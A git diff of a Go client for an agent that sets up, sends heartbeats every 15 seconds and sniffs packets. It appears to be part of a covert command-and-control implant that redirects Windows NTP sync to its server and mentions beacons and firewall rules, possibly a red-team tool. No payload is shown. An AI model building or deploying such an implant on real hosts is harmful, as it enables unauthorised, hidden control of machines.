@@ -1,17 +1,20 @@
 package main
 
 import (
-	"fmt"
+
 	//"os"
-	"os/exec"
+
 	//"strings"
 	//"bytes"
 	//"log"
 
 	//"mesa/client/pkg/ntppacket"
 	//"mesa/client/pkg/listener"
+
+	"fmt"
 	"mesa/goclient/pkg/agent"
 	"mesa/goclient/pkg/handler"
+	"time"
 	//"github.com/google/gopacket"
 	//"github.com/google/gopacket/pcap"
 )
@@ -27,37 +30,28 @@ func init() {
 }
 
 func main() {
-	Setup(newAgent)
+	agent.Setup(newAgent)
+
+	ticker := time.NewTicker(15 * time.Second) //heartbeat timer
+	done := make(chan bool)
+
+	go func() {
+		for {
+			select {
+			case <-done:
+				return
+			case <-ticker.C:
+				handler.Heartbeat(newAgent)
+				fmt.Println("testing heartbeat")
+			}
+		}
+	}()
 
 	handler.StartSniffer(newAgent)
 
-}
-
-//Setup - sets up NTP configurations based on OS, sends out first beacon, add firewall rule every 5?
-func Setup(newAgent agent.Agent) {
-	var commandList []string
-	if newAgent.OpSys == "Windows" {
-		commandList = []string{
-			"net start w32time",
-			"w32tm /config /syncfromflags:manual /manualpeerlist:" + string(newAgent.ServerIP),
-			"w32tm /config /update",
-			"w32tm /resync"} //TODO add firewall rule?
-	} else {
-		commandList = []string{
-			"echo working", 
-			"echo yes!"} //TODO add actual command
-	}
-
-	for _, s := range commandList {
-		output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, s).Output()
-
-		if err != nil {
-			fmt.Println(err.Error())
-			fmt.Println("Couldn't execute command")
-		}
-
-		fmt.Println(string(output))
-	}
+	ticker.Stop()
+	done <- true
+	fmt.Println("Ticker stopped")
 
 }
 
